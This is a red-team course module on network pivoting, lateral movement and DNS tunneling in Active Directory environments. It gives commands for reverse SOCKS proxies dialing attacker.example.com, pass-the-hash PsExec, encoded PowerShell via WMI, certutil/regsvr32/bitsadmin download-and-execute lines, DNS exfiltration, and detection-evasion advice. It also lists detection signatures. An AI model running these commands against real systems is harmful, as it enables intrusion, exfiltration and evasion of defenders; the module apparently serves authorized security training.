# Module 19 · Network Pivoting & Lateral Movement

> *"You don't have a foothold until you can route through it. You don't have lateral movement until you can keep doing it without anybody noticing."*

You have a credential and a remote shell. Now what? The network is segmented. The asset graph from Part 3 shows fifty hosts you can't yet reach. The DC is on a different VLAN than your pivot box. Your egress is monitored.

This module is the operator's bread and butter: **getting traffic where it isn't supposed to go, executing code where you aren't supposed to be, and looking like normal admin activity while you do it.**

## The pivot mental model

A **pivot** is an architectural rerouting of your network position. There are four broad classes:

| Class | Mechanism | When to use |
|---|---|---|
| **Layer-3 routing pivot** | The compromised host becomes an IP router (`sysctl net.ipv4.ip_forward=1`, NAT) | Linux pivots, you have root |
| **TCP port forwarding** | Bind local socket → forward to remote target via SSH / proxychains / Chisel | You have user-level shell, no root |
| **SOCKS proxy** | Compromised host runs a SOCKS server; your tools `proxychains`-route through it | Multi-target, you want one tunnel for many flows |
| **Application-layer tunnel** | Encapsulate TCP-in-DNS, TCP-in-HTTPS, TCP-in-ICMP | Egress filtering blocks direct outbound, but DNS/HTTPS allowed |

You'll combine these. A typical engagement will look like:

```
Attacker laptop
   │
   │  ssh -D 1080 → [external pivot]
   ▼
External pivot (cloud VM)  
   │
   │  ssh -L 8443:dc01.lab.local:445 → [internal foothold]
   ▼
Internal foothold (compromised dev box)  
   │  
   │  TCP 445 → [Domain Controller]
   ▼  
Target DC
```

You then run `proxychains4 python3 -m redshift_toolkit.ad.kerberoast --dc 127.0.0.1:8443 ...` and the traffic threads through three hops.

## SOCKS proxy with `pivot_proxy.py`

Our SOCKS5 implementation has two modes:

### Mode 1: server-on-pivot (you upload it)

Drop the script onto the compromised host, run it. Listens on a port, accepts SOCKS5 connections, forwards them. Then on your laptop:

```bash
# On compromised box (Linux/Windows where Python is installed)
python3 pivot_proxy.py --listen 0.0.0.0:1080

# On your laptop — point proxychains at the pivot
echo 'socks5 10.0.0.5 1080' >> /etc/proxychains4.conf
proxychains4 python3 -m redshift_toolkit.ad.ad_enum --dc dc01.lab.local ...
```

### Mode 2: reverse SOCKS (the box dials home)

If the pivot host can't *accept* inbound (NAT, firewall), have it dial out to your attacker host:

```bash
# On your attacker box
python3 -m redshift_toolkit.postex.pivot_proxy --reverse-listen 0.0.0.0:8443

# On the pivot — connects out to attacker, exposes a SOCKS proxy locally on attacker:1080
python3 pivot_proxy.py --reverse-connect attacker.example.com:8443
```

Mode 2 is canonical "dial-home" red-team behavior — same shape as Cobalt Strike's reverse SOCKS feature.

## SSH-based forwarding

When the pivot host runs SSH (every Linux box, increasingly Windows), `ssh_tunnel.py` wraps OpenSSH for the three forwarding modes:

| Mode | OpenSSH flag | Use |
|---|---|---|
| Local forward | `-L localport:remotehost:remoteport` | Single TCP service from the pivot's perspective |
| Remote forward | `-R remoteport:localhost:localport` | Expose your local service to the pivot's network |
| Dynamic forward (SOCKS) | `-D port` | Multi-target SOCKS proxy via SSH |

Why use the wrapper rather than raw SSH:

- It manages keepalives (`ServerAliveInterval=30`) so tunnels survive idle drops.
- Auto-reconnects on disconnect with exponential backoff.
- Logs every connection (forensics-friendly when reporting).
- Supports key-based auth from a YubiKey or `ssh-agent`.

```bash
# Open a SOCKS5 proxy through pivot, on local port 1080
python3 -m redshift_toolkit.postex.ssh_tunnel \
    --target alice@pivot.example.com --dynamic 1080 --keep-alive

# Forward port 445 of internal DC through pivot
python3 -m redshift_toolkit.postex.ssh_tunnel \
    --target alice@pivot.example.com \
    --local 8445:dc01.lab.local:445
```

## Generic TCP forwarder

Sometimes neither SSH nor SOCKS fits — you just need a TCP relay. `port_forwarder.py` is a small `asyncio` server that:

- Listens on `LISTEN_HOST:LISTEN_PORT`
- Forwards every accepted connection to `TARGET_HOST:TARGET_PORT`
- Handles bidirectional I/O without buffering issues
- Logs first 64 bytes of each direction (for protocol identification)

```bash
# Forward port 3389 of an internal Windows box to your localhost
python3 -m redshift_toolkit.postex.port_forwarder \
    --listen 127.0.0.1:13389 --target 10.0.0.50:3389
```

Then `xfreerdp /v:127.0.0.1:13389 /u:alice` connects through the relay.

## Lateral movement: PsExec, WMI, WinRM

Once you're inside an AD network and have a privileged credential, the question becomes: how do I run code on `WS01.lab.local`? Three protocol-native answers:

### PsExec-style (SMB + service)

The original Sysinternals PsExec works by:
1. Copying your binary to `\\target\ADMIN$\` over SMB
2. Creating a Windows service via the SCM (`svcctl`) RPC interface, pointed at that binary
3. Starting the service (which runs as `NT AUTHORITY\SYSTEM`)
4. Reading stdout/stderr from named pipes
5. Cleaning up: stopping service, deleting binary

`psexec_lite.py` reimplements steps 2-5 (we *don't* drop a binary — we run a one-shot command).

```bash
python3 -m redshift_toolkit.postex.psexec_lite \
    --target 10.0.0.50 --user alice -p 'Password1' \
    --command 'whoami /priv'

# Or with hashes (pass-the-hash):
python3 -m redshift_toolkit.postex.psexec_lite \
    --target 10.0.0.50 --user alice \
    --hash 'aad3b435b51404eeaad3b435b51404ee:5d41...' \
    --command 'whoami /priv'
```

#### Detection

Event 7045 ("A service was installed on the system") with random service name. Modern detection rules look for:

- Service name length > 12 chars
- Service binary path in `%TEMP%` or `%SystemRoot%\TEMP`
- Source process: `services.exe` (PID 4 SMB)

### WMI execution

`wmi_exec.py` uses the `Win32_Process.Create` WMI method to spawn a process on the remote target. WMI is an alternative to SMB-based execution and frequently bypasses SMB-only EDR rules.

```bash
python3 -m redshift_toolkit.postex.wmi_exec \
    --target 10.0.0.50 --user alice -p 'Password1' \
    --command 'powershell -Enc <base64 payload>'
```

#### Mechanics

- Connects to RPC over SMB (port 135 + dynamic)
- Calls `IWbemServices::ExecMethod` for `Win32_Process::Create`
- Process inherits a *token* from the WMI service, runs as the user

#### Detection

- Event 4688 with parent process `WmiPrvSE.exe` and unusual command line
- Sysmon Event 1 (process creation) with same signature
- Sigma rule `proc_creation_win_susp_wmi.yml`

### WinRM execution

Modern Windows AD admin uses **WinRM** (HTTP-based, port 5985 / 5986) increasingly over SMB. If WinRM is enabled, `winrm_exec.py` is your stealthiest option — it looks like Microsoft's own `Enter-PSSession`.

```bash
python3 -m redshift_toolkit.postex.winrm_exec \
    --target 10.0.0.50 --user alice -p 'Password1' \
    --command 'Get-Process | Select Name,Id'
```

#### Mechanics

WS-Management protocol (a SOAP wrapper). Auth via NTLM, Kerberos, or basic. We use NTLM by default, Kerberos with `--use-kerb`.

#### Detection

- Event 4624 logon-type 3, source process `wsmprovhost.exe`
- WinRM event 91 ("New session 'Microsoft.PowerShell' was created")
- PowerShell module logging Event 4103
- Script block logging Event 4104

A defender who has tuned WinRM detection will see you. A defender on a typical mid-market AD will not.

## DNS tunneling

When egress is locked down (proxy whitelist, no direct outbound TCP), DNS often still resolves outward. A DNS tunnel turns DNS queries into a TCP-over-DNS bidirectional channel.

### How it works

- Attacker controls authoritative DNS for `c2.example.com`
- Pivot encodes data in subdomain labels: `aGVsbG8gd29ybGQ.c2.example.com`
- Authoritative server decodes label, encodes response in TXT record
- Throughput is poor (a few KB/s with batching), but it goes through

```bash
# Server-side (you run this on a public box that owns c2.example.com NS records)
python3 -m redshift_toolkit.postex.dns_tunnel --server --domain c2.example.com

# Client-side (on the foothold)
python3 -m redshift_toolkit.postex.dns_tunnel --client --domain c2.example.com \
    --target 10.0.0.50:445 --listen 127.0.0.1:8445
```

Detection on a mature SOC:
- Subdomain length > 30 chars (DNS exfil signature)
- Sustained TXT record queries to a single domain
- Splunk: `index=dns | eval len=len(query) | where len>50 | stats count by domain`

For a real engagement, prefer **HTTPS-based** tunneling (Sliver, Mythic) — DNS tunneling is loud.

## Living off the land (LOL)

Modern AD operators avoid dropping any custom binary. Every operation uses a binary that ships with Windows or the target:

| Goal | LOL binary | Why |
|---|---|---|
| Download a file | `certutil -urlcache -f http://x/y.exe out.exe` | Looks like cert validation |
| Encode/decode | `certutil -encode/-decode` | Standard tool |
| Execute DLL | `rundll32.exe x.dll,EntryPoint` | Standard tool |
| Execute scriptlet | `regsvr32 /s /n /u /i:http://x/y.sct scrobj.dll` | Squiblydoo |
| HTTP request | `bitsadmin /transfer myJob /download http://x/y c:\y` | Standard tool |
| Schedule task | `schtasks /create /sc minute /tn UpdaterX /tr "..."` | Standard tool |

Mature SOCs have telemetry on every one of these. The **LOLBAS project** (`lolbas-project.github.io`) catalogs ~200 Windows binaries with offensive uses; **GTFOBins** (`gtfobins.github.io`) does the same for Linux.

When an interviewer asks "what's the difference between PsExec and `sc.exe \\target create`?", the answer is: same effect, but one looks like an admin tool because it *is* the admin tool.

## OPSEC: not getting caught

The five things that get an operator burned:

1. **Hard-coded user-agent strings.** Don't ever ship `python-requests/2.x` to a target. We override UA in `http_client` (Part 4).
2. **Default service names.** PsExec's default `PSEXESVC` is signatured. Always override.
3. **Default port choices.** Don't bind reverse shells to 4444. Use 443 (which legitimate apps use).
4. **High-volume LDAP / Kerberos requests.** Spread Kerberoast across hours; spread enumeration across days.
5. **Sysmon event 22 (DNSEvent).** Sysmon logs every DNS query by every process. If your tool issues DNS for `attacker.evil`, that's logged. Use IP literals where possible, or pivot through a host that has legitimate DNS traffic.

We bake these defaults into Part 5's tooling — read each script's header for OPSEC notes.

## Industry framings

| Vertical | Pivoting reality |
|---|---|
| **Defense / IC** | Strict outbound — DNS often the only egress. SIPRNet/JWICS isolated, but unclassified networks (NIPRNet) are full TCP outbound. |
| **Healthcare** | Wildly flat networks. Once you're in, you can hit anything. Medical device subnets often have *no* segmentation. |
| **Financial** | Strong segmentation between corp/dev/prod. Cardholder Data Environment (CDE) is meant to be air-gapped — your job is to find the pivot. |
| **ICS / OT** | DMZ between IT and OT (Purdue model). Pivots through historian/HMI/engineering workstations are the path. |
| **Cloud / hybrid** | AAD Connect server is the pivot — it bridges on-prem AD and Azure AD. Compromise it = own both. |

## Lab exercises

1. **HTB pivoting lab.** Build a 3-host chain (attacker → pivot → DC). Run AS-REP roast through SOCKS5 proxy.
2. **GOAD multi-hop.** Pivot from `WS01` → `WS02` (no direct route) using SSH `-J`.
3. **DNS tunnel.** Stand up `c2.example.com` (use Cloudflare for the NS), exfil 1MB through DNS.
4. **WinRM stealth lateral.** Move from one workstation to another via WinRM. Compare Sysmon logs vs. PsExec.
5. **PrintNightmare → lateral.** (Part 7 preview) Use a print spooler bug to get SYSTEM on a remote workstation, then pivot.

## Next steps

We've moved laterally. The next two modules are about **what to do when you land** — escalating from user to root on Linux ([Module 20](20-linux-privesc.md)) and from user to SYSTEM on Windows ([Module 21](21-windows-privesc.md)).
